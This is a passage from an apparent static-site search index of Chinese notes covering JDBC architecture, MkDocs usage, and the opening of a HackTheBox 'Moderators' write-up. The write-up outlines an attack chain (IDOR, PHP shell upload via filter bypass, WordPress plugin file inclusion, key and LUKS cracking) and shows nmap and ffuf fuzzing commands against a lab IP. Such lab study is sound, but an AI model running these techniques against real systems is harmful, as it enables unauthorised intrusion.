93\u8bbf\u95ee\u4ee3\u7801\uff0c\u5374\u53ef\u4ee5\u8bbf\u95ee\u5404\u79cd\u4e0d\u540c\u7684\u6570\u636e\u5e93\uff0c\u56e0\u4e3a\u4ed6\u4eec\u90fd\u63d0\u4f9b\u4e86\u6807\u51c6\u7684JDBC\u9a71\u52a8\uff1a</p> <pre><code>\u250c \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2510\n\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n   \u2502   Java App    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n           \u2502\n\u2502          \u25bc          \u2502\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u2502JDBC Interface \u2502\u25c0\u2500\u253c\u2500\u2500\u2500 JDK\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502          \u2502          \u2502\n           \u25bc\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n   \u2502  JDBC Driver  \u2502\u25c0\u2500\u2500\u2500\u2500\u2500 Vendor\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n           \u2502\n\u2514 \u2500 \u2500 \u2500 \u2500 \u2500\u2502\u2500 \u2500 \u2500 \u2500 \u2500 \u2518\n           \u25bc\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502   Database    \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u4ece\u4ee3\u7801\u6765\u770b\uff0cJava\u6807\u51c6\u5e93\u81ea\u5e26\u7684JDBC\u63a5\u53e3\u5176\u5b9e\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u7ec4\u63a5\u53e3\uff0c\u800c\u67d0\u4e2a\u5177\u4f53\u7684JDBC\u9a71\u52a8\u5176\u5b9e\u5c31\u662f\u5b9e\u73b0\u4e86\u8fd9\u4e9b\u63a5\u53e3\u7684\u7c7b\uff1a</p> <pre><code>\u250c \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2510\n\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n   \u2502   Java App    \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n           \u2502\n\u2502          \u25bc          \u2502\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u2502JDBC Interface \u2502\u25c0\u2500\u253c\u2500\u2500\u2500 JDK\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502          \u2502          \u2502\n           \u25bc\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n   \u2502 MySQL Driver  \u2502\u25c0\u2500\u2500\u2500\u2500\u2500 Oracle\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n           \u2502\n\u2514 \u2500 \u2500 \u2500 \u2500 \u2500\u2502\u2500 \u2500 \u2500 \u2500 \u2500 \u2518\n           \u25bc\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502     MySQL     \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u4e00\u4e2aMySQL\u7684JDBC\u7684\u9a71\u52a8\u5c31\u662f\u4e00\u4e2ajar\u5305\uff0c\u5b83\u672c\u8eab\u4e5f\u662f\u7eafJava\u7f16\u5199\u7684\u3002\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684\u4ee3\u7801\u53ea\u9700\u8981\u5f15\u7528Java\u6807\u51c6\u5e93\u63d0\u4f9b\u7684java.sql\u5305\u4e0b\u9762\u7684\u76f8\u5173\u63a5\u53e3\uff0c\u7531\u6b64\u518d\u95f4\u63a5\u5730\u901a\u8fc7MySQL\u9a71\u52a8\u7684jar\u5305\u901a\u8fc7\u7f51\u7edc\u8bbf\u95eeMySQL\u670d\u52a1\u5668\uff0c\u6240\u6709\u590d\u6742\u7684\u7f51\u7edc\u901a\u8baf\u90fd\u88ab\u5c01\u88c5\u5230JDBC\u9a71\u52a8\u4e2d\uff0c\u56e0\u6b64\uff0cJava\u7a0b\u5e8f\u672c\u8eab\u53ea\u9700\u8981\u5f15\u5165\u4e00\u4e2aMySQL\u9a71\u52a8\u7684jar\u5305\u5c31\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95eeMySQL\u670d\u52a1\u5668\uff1a</p> <pre><code>\u250c \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2510\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u2502   App.class   \u2502  \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502          \u2502          \u2502\n           \u25bc\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502\n   \u2502  java.sql.*   \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n           \u2502\n\u2502          \u25bc          \u2502\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     TCP    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  \u2502 mysql-xxx.jar \u2502\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502     MySQL     \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2514 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2500 \u2518\n          JVM\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/JDBC/#_1","title":"\u5c0f\u7ed3","text":"<p>\u4f7f\u7528JDBC\u7684\u597d\u5904\u662f\uff1a</p> <ul> <li> <p>\u5404\u6570\u636e\u5e93\u5382\u5546\u4f7f\u7528\u76f8\u540c\u7684\u63a5\u53e3\uff0cJava\u4ee3\u7801\u4e0d\u9700\u8981\u9488\u5bf9\u4e0d\u540c\u6570\u636e\u5e93\u5206\u522b\u5f00\u53d1\uff1b</p> </li> <li> <p>Java\u7a0b\u5e8f\u7f16\u8bd1\u671f\u4ec5\u4f9d\u8d56java.sql\u5305\uff0c\u4e0d\u4f9d\u8d56\u5177\u4f53\u6570\u636e\u5e93\u7684jar\u5305\uff1b</p> </li> <li> <p>\u53ef\u968f\u65f6\u66ff\u6362\u5e95\u5c42\u6570\u636e\u5e93\uff0c\u8bbf\u95ee\u6570\u636e\u5e93\u7684Java\u4ee3\u7801\u57fa\u672c\u4e0d\u53d8\u3002</p> </li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/","title":"Mkdocs \u4f7f\u7528\u6587\u6863","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_1","title":"\u5f00\u59cb","text":"<p>\u521b\u5efa\u4e00\u4e2a\u65b0\u9879\u76ee</p> <pre><code>$ mkdocs new my-project\n$ cd my-project\n</code></pre> <p>\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6 <code>mkdocs.yml</code>, \u548c\u4e00\u4e2a\u5305\u542b\u6587\u6863\u6e90\u7801\u7684 <code>docs</code> \u6587\u4ef6\u5939. \u5728 <code>docs</code> \u6587\u4ef6\u5939\u91cc\u5305\u542b\u4e86\u4e00\u4e2a\u540d\u4e3a <code>index.md</code> \u7684\u6587\u6863.</p> <p>MkDocs \u5305\u542b\u4e86\u4e00\u4e2a\u5185\u5efa\u7684\u670d\u52a1\u5668\u4ee5\u9884\u89c8\u5f53\u524d\u6587\u6863. \u63a7\u5236\u53f0\u5207\u6362\u5f53\u524d\u76ee\u5f55\u5230 <code>mkdocs.yml</code> \u914d\u7f6e\u6587\u4ef6\u76f8\u540c\u6587\u4ef6\u5939, \u8f93\u5165 <code>mkdocs serve</code> \u547d\u4ee4\u4ee5\u542f\u52a8\u5185\u5efa\u670d\u52a1\u5668:</p> <pre><code>$ mkdocs serve\nRunning at: http://127.0.0.1:8000/\n</code></pre> <p>\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 http://127.0.0.1:8000/ , \u53ef\u9884\u89c8\u3002</p> <p>\u5185\u5efa\u670d\u52a1\u5668\u652f\u6301\u5728\u914d\u7f6e\u6587\u4ef6,\u6587\u6863\u76ee\u5f55\u6216\u4e3b\u9898\u53d1\u751f\u6539\u53d8\u65f6\u81ea\u52a8\u8f7d\u5165\u5e76\u91cd\u65b0\u751f\u6210\u6587\u6863\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_2","title":"\u66f4\u6539\u7f51\u7ad9\u6807\u9898","text":"<p>\u7f16\u8f91 <code>medics.yml</code> \u4fee\u6539 <code>site_name</code> \u503c\u5373\u53ef\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_3","title":"\u7f51\u9875\u6807\u9898","text":"<p>\u7f16\u8f91 <code>doc/index.md</code> \u6587\u6863\uff0c\u5c06\u9ed8\u8ba4\u6807\u9898\u6539\u4e3a <code>MkLorum</code>\uff0c\u5237\u65b0\u6d4f\u89c8\u5668\u5373\u53ef\u770b\u5230\u7f51\u9875\u6807\u9898\u53d8\u5316</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_4","title":"\u6dfb\u52a0\u9875\u9762","text":"<pre><code>$ touch docs/about.md\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_5","title":"\u4e3b\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>site_name: MkLorum\npages:\n- [index.md, Home]      #\u6dfb\u52a0 Home \u5bfc\u822a\u680f\n- [about.md, About]     #\u6dfb\u52a0 About \u5bfc\u822a\u680f\ntheme: readthedocs      #\u914d\u7f6e\u4e3b\u9898\u4e3a readthedocs\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_6","title":"\u7ad9\u70b9\u751f\u6210","text":"<pre><code>$ mkdocs build                  #\u751f\u6210\u7f51\u9875\u9759\u6001\u6587\u4ef6\n$ ls site                               #\u6d4f\u89c8\u751f\u6210\u7684\u7f51\u7ad9\u76ee\u5f55\u5185\u5bb9\n$ mkdocs build --clean  #\u6e05\u9664site\u76ee\u5f55\u91cc\u5df2\u5220\u9664\u6587\u6863\u7684\u9759\u6001\u5185\u5bb9\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_7","title":"\u53d1\u5e03","text":"<p>\u53ea\u9700\u4e0a\u4f20 <code>site</code> \u76ee\u5f55\u5230\u9700\u8981\u53d1\u5e03\u7684\u4f4d\u7f6e\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_8","title":"\u64b0\u5199\u6587\u6863","text":"<p>\u5982\u4f55\u64b0\u5199 markdown \u6e90\u7801\u5e76\u5b89\u6392\u76ee\u5f55\u7ed3\u6784.</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_9","title":"\u76ee\u5f55\u7ed3\u6784","text":"<pre><code>mkdocs.yml\ndocs/\n        index.md/.markdown/.mdown/.mkdn/.mkd        #\u652f\u6301\u540e\u7f00\u540d\u5f62\u5f0f\n        about.md\n        license.md\n        user-guide/getting-started.md           #\u591a\u7ea7\u76ee\u5f55\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_10","title":"\u751f\u6210\u7684\u76ee\u5f55","text":"<pre><code>/\n/about/\n/license/\n/user-guide/getting-started/\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_11","title":"\u94fe\u63a5","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#markdown","title":"Markdown \u6269\u5c55","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_12","title":"\u8868\u683c","text":"<pre><code>First Header | Second Header | Third Header\n------------: | :-------------: | :------------\nContent Cell | Content Cell  | Content Cell\nContent Cell | Content Cell  | Content Cell\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_13","title":"\u4ee3\u7801\u5757","text":"<p>\u4e09\u4e2a ` \u53cd\u5f15\u53f7</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_14","title":"\u914d\u7f6e","text":"<p>\u6240\u6709\u914d\u7f6e\u53c2\u6570</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Mkdocs%20%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/#_15","title":"\u7b80\u4ecb","text":"<p>\u9879\u76ee\u914d\u7f6e\u5728 <code>medics.yml</code> \u6587\u4ef6\u4e2d\u8bbe\u7f6e</p> <p>\u914d\u7f6e\u6587\u4ef6\u4e2d\u81f3\u5c11\u5e94\u5305\u542b <code>site_name</code> \u9009\u9879. \u5176\u4f59\u9009\u9879\u90fd\u662f\u53ef\u9009\u7684.</p> \u53c2\u6570 \u89e3\u91ca \u9ed8\u8ba4\u503c <code>site_name</code> \u5fc5\u8981\uff0c\u9879\u76ee\u6587\u6863\u7684\u4e3b\u6807\u9898 <code>site_url</code> \u8bbe\u7f6e\u7ad9\u70b9\u7684 URL <code>null</code> <code>repo_url</code> \u5982\u679c\u8bbe\u7f6e\u4e86\u8be5\u9879, \u6bcf\u4e2a\u9875\u9762\u5c06\u4f1a\u6dfb\u52a0\u4e00\u4e2a\u94fe\u63a5\u5230\u4f60\u7684 GitHub \u6216 Bitbucket \u7248\u672c\u5e93. <code>null</code> <code>repo_name</code> \u6dfb\u52a0\u5916\u90e8\u94fe\u63a5 <code>GitHub</code> \u3001<code>Bitbucket</code>\u3001<code>null</code> <code>site_description</code> \u8bbe\u7f6e\u7ad9\u70b9\u63cf\u8ff0\u3002\u5728 HTML \u5934\u90e8\u6dfb\u52a0\u4e00\u4e2a meta \u6807\u7b7e <code>null</code> <code>site_author</code> \u8bbe\u7f6e\u7ad9\u70b9\u4f5c\u8005\u3002\u8fd9\u5c06\u8fd9 HTML \u5934\u90e8\u6dfb\u52a0\u4e00\u4e2a meta \u6807\u7b7e <code>null</code> <code>site_favicon</code> \u9700\u8981\u5c06 <code>favicon.ico</code> \u653e\u5230 <code>docs/</code> \u76ee\u5f55 <code>null</code> <code>copyright</code> \u8bbe\u7f6e\u7ad9\u70b9\u7248\u6743\u4fe1\u606f <code>null</code> <code>google_analytics</code> \u8bbe\u7f6e Google \u7ad9\u70b9\u5206\u6790\u5de5\u5177 <code>null</code> pages \u8bbe\u7f6e\u76ee\u5f55\u7ed3\u6784 theme \u8bbe\u7f6e\u4e3b\u9898 theme_dir \u4e3b\u9898\u6240\u5728\u4f4d\u7f6e docs_dir \u8bbe\u7f6e markdown \u6587\u6863\u76ee\u5f55 site_dir \u8bbe\u7f6e\u751f\u6210\u7684 HTML \u548c\u5176\u4ed6\u6587\u4ef6\u6240\u5728\u76ee\u5f55 extra_css \u8bbe\u5b9a\u4e3b\u9898\u6240\u9700\u7684\u989d\u5916\u7684\u6837\u5f0f\u6587\u4ef6 extra_javascript \u8bbe\u5b9a\u4e3b\u9898\u6240\u9700\u7684\u989d\u5916\u7684\u811a\u672c\u6587\u4ef6 use_directory_urls \u8bbe\u7f6e\u6587\u6863\u4e2d\u7684\u94fe\u63a5\u7c7b\u578b dev_addr \u8bbe\u7f6e\u6620\u5c04\u5730\u5740 <code>0.0.0.0:80</code> markdown_extensions Markdown \u8bed\u6cd5\u6269\u5c55\uff0c\u4f8b\u5982, \u6fc0\u6d3b SmartyPants typography extension \u6269\u5c55"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/","title":"Moderators   HTB","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#synopsis","title":"Synopsis","text":"<p>Moderators \u662f\u4e00\u4e2a\u786c Linux \u673a\u5668\uff0c\u5177\u6709\u4e00\u4e2a\u535a\u5ba2\uff0c\u5176\u4e2d\u5305\u542b\u5b89\u5168\u62a5\u544a\u3002</p> <p>\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 (IDOR) \u53ef\u4ee5\u627e\u5230\u672a\u516c\u5f00\u7684\u62a5\u544a\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20 PDF \u6587\u4ef6\u7684\u65e5\u5fd7\u9875\u9762\u3002</p> <p>\u4f7f\u7528\u57fa\u672c\u8fc7\u6ee4\u5668\u7ed5\u8fc7\uff0c\u53ef\u4ee5\u4e0a\u4f20 PHP shell \u5e76\u4ee5 www-data \u7684\u8eab\u4efd\u83b7\u5f97\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u7136\u540e\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a WordPress \u7ad9\u70b9\u5728\u5185\u90e8\u8fd0\u884c\u5728\u7aef\u53e3 8080 \u4e0a\u3002\u8be5\u7ad9\u70b9\u5305\u542b\u4e24\u4e2a\u63d2\u4ef6\uff0cbrandfolder \u548c password-manager\uff0c\u524d\u8005\u5177\u6709\u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u4f1a\u5bfc\u81f4\u4f5c\u4e3a lexi \u7528\u6237\u7684 shell\u3002 </p> <p>SSH \u5bc6\u94a5\u53ef\u4ee5\u5728 WordPress \u6570\u636e\u5e93\u4e2d\u627e\u5230\uff0c\u9700\u8981\u4ece\u5bc6\u7801\u7ba1\u7406\u5668\u63d2\u4ef6\u4e2d\u7834\u89e3\u3002\u4fee\u6539\u6240\u8ff0\u63d2\u4ef6\u5141\u8bb8\u5bf9 SSH \u5bc6\u94a5\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ece\u800c\u53ef\u4ee5\u8bbf\u95ee\u540d\u4e3a john \u7684\u7b2c\u4e8c\u4e2a\u7528\u6237\u3002</p> <p>\u5728\u7b2c\u4e8c\u4e2a\u7528\u6237\u7684\u4e3b\u6587\u4ef6\u5939\u4e2d\u6709\u4e00\u4e2a\u865a\u62df\u78c1\u76d8\u6620\u50cf (.vdi) \u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5df2\u52a0\u5bc6\u3002\u4f7f\u7528 .vbox \u5bc6\u7801\u7834\u89e3\u5668\u53ef\u4ee5\u6062\u590d\u5bc6\u7801\u3002</p> <p>\u78c1\u76d8\u4e0a\u6709\u4e00\u4e2a LUKS \u52a0\u5bc6\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 bash \u811a\u672c\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u3002</p> <p>\u89e3\u5bc6\u540e\uff0c\u6587\u4ef6\u7cfb\u7edf\u5305\u542b\u811a\u672c\uff0c\u5176\u4e2d\u4e00\u4e2a\u5305\u542b\u7b2c\u4e8c\u4e2a\u7528\u6237\u7684\u5bc6\u7801\u3002\u5bc6\u7801\u53ef\u7528\u4e8e\u4f7f\u7528 sudo \u8fd0\u884c\u4efb\u4f55\u547d\u4ee4\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#skills-required","title":"Skills Required","text":"<p>Enumeration Fuzzing web applications Password cracking Basic usage of Virtual Machines</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#skills-learned","title":"Skills Learned","text":"<p>Bypassing file upload filters [[Insecure direct object references (IDOR)|Insecure Direct Object Reference(IDOR \u4e0d\u5b89\u5168\u5bf9\u8c61\u5f15\u7528)]] Leveraging WordPress plugin vulnerabilities(\u5229\u7528 WordPress \u63d2\u4ef6\u6f0f\u6d1e)</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Moderators%20-%20HTB/#enumeration","title":"Enumeration","text":"<p>\u4f7f\u7528 <code>Nmap</code> \u626b\u63cf\u7aef\u53e3</p> <pre><code>$ ports=$(nmap -p- --min-rate=1000 -T4 $target | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) \n$ nmap -p$ports -sC -sV 10.10.11.173\n</code></pre> <p>![[Pasted image 20221112172654.png]]</p> <p>Nmap \u8f93\u51fa\u663e\u793a\u5f53\u524d\u53ea\u6709 2 \u4e2a\u7aef\u53e3\u6253\u5f00\uff0c\u7aef\u53e3 22 (SSH) \u548c\u7aef\u53e3 80 (Apache2)\u3002\u8ba9\u6211\u4eec\u7528\u6d4f\u89c8\u5668\u5bfc\u822a\u5230 80 \u7aef\u53e3\u6765\u770b\u770b\u8fd9\u4e2a\u7f51\u7ad9\u3002</p> <p>![[Pasted image 20221112172808.png]]</p> <p>\u6700\u521d\u7684\u7f51\u9875\u6709\u4e00\u4e2a\u6b22\u8fce\u9875\u9762\uff0c\u867d\u7136\u4e0a\u9762\u4f3c\u4e4e\u6ca1\u6709\u4ec0\u4e48\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u4f46\u6709\u4e00\u4e2a\u535a\u5ba2\u94fe\u63a5\u3002\u5bfc\u822a\u5230\u6240\u8ff0\u94fe\u63a5\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4ee5\u4e0b\u9875\u9762\u3002</p> <p>![[Pasted image 20221112172852.png]]</p> <p>\u4e0a\u8ff0\u535a\u5ba2\u8ba8\u8bba\u4e86\u5b89\u5168\u6f0f\u6d1e\u62ab\u9732\uff0c\u5e76\u63d0\u4f9b\u4e86\u62a5\u544a\u94fe\u63a5\u3002</p> <p>![[Pasted image 20221112172958.png]]</p> <p>\u770b\u770b\u8fd9\u4efd\u62a5\u544a\uff0c\u5230\u76ee\u524d\u4e3a\u6b62\u8fd8\u6ca1\u6709\u592a\u591a\u7684\u5174\u8da3\uff0c\u4f46\u662f\uff0cURL \u63ed\u793a\u4e86\u4e00\u4e2a\u6f5c\u5728\u7684\u653b\u51fb\u5a92\u4ecb\u3002\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 (IDOR) \u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6839\u636e\u53ef\u9884\u6d4b\u7684\u6a21\u5f0f\uff08\u5982\u6570\u5b57\u5e8f\u5217\uff09\u731c\u6d4b\u5bf9\u8c61\u3002\u5728 URL \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u62a5\u544a\u94fe\u63a5\u5230\u7f16\u53f7\u89c4\u5219 (8121)\u3002\u8ba9\u6211\u4eec\u4f7f\u7528 Ffuf \u5bf9\u53ef\u80fd\u9690\u85cf\u7684\u62a5\u544a\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u7528\u6570\u5b57\u5e8f\u5217\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>seq</code> \u547d\u4ee4\u8f7b\u677e\u521b\u5efa\u6570\u5b57\u5355\u8bcd\u5217\u8868\u5e76\u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06 Ffuf \u4e0e\u751f\u6210\u7684\u8bcd\u8868\u4e00\u8d77\u4f7f\u7528\uff0c\u540c\u65f6\u4f7f\u7528 <code>-fw</code> \u6807\u8bb0\u8fc7\u6ee4\u6389\u9ed8\u8ba4\u7ed3\u679c\u3002</p> <pre><code>$ seq 1111 9999 &gt; report_ids \n$ ffuf -u 'http://10.10.11.173/reports.php?report=FUZZ' -w report_ids -fw 3091\n</code></pre> <p>![[Pasted image 20221112173208.png]]</p> <p>\u5982\u8f93\u51fa\u6240\u793a\uff0c\u603b\u5171\u6709 6 \u4e2a\u62a5\u544a\u3002\u8ba9\u6211\u4eec\u5c06\u8fd9\u4e9b\u62a5\u544a ID \u4fdd\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a correct_ids \u7684\u65b0\u6587\u4ef6\u4e2d\u3002\u6d4f\u89c8\u6240\u6709\u663e\u793a\u7684\u62a5\u544a\uff0c\u53ea\u6709\u62a5\u544a 9798 \u770b\u8d77\u6765\u5f88\u6709\u8da3\u3002</p> <p>\u5df2\u8bc6\u522b\u7684\u62a5\u544a\u672b\u5c3e\u5305\u542b\u4e00\u4e2a\u201cLOGS\u201d\u5bf9\u8c61\u548c\u5b57\u7b26\u4e32 <code>logs/e21cece511f43a5cb18d4932429915ed/</code> \uff0c\u8fd9\u53ef\u7591\u5730\u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u76ee\u5f55\u3002\u5c1d\u8bd5\u8bbf\u95ee\u7f51\u7ad9\u4e2d\u7684\u6b64\u76ee\u5f55\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u767d\u9875\u9762\u3002\u76f8\u53cd\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u901a\u8fc7\u4f7f\u7528 Ffuf \u5bf9\u6587\u4ef6\u8fdb\u884c\u6a21\u7cca\u6d4b\u8bd5\u3002\u5b89\u5168\u62a5\u544a\u901a\u5e38\u4fdd\u5b58\u4e3a PDF\u3001Doc/Docx \u7b49\u6587\u6863\u6587\u4ef6\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u4e13\u95e8\u9488\u5bf9\u8fd9\u4e9b\u6587\u4ef6\u5c1d\u8bd5 fuzzing\u3002</p> <pre><code>$ ffuf -u 'http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ' -w /usr/share/wordlists/dirb/common.txt -e .pdf,.doc,.docx\n</code></pre> <p>![[Pasted image 20221112175128.png]]</p> <p>Ffuf \u7684\u8f93\u51fa\u663e\u793a\u6709\u4e00\u4e2a\u540d\u4e3a logs.pdf \u7684 PDF \u6587\u4ef6\u3002\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u6587\u4ef6\u3002</p> <p>![[Pasted image 20221112175259.png]]</p> <p>\u4e0d\u5e78\u7684\u662f\uff0c\u8be5\u6587\u4ef6\u662f\u7a7a\u7684\uff0c\u4f46\u7531\u4e8e\u62a5\u544a\u9875\u9762\u5bb9\u6613\u53d7\u5230 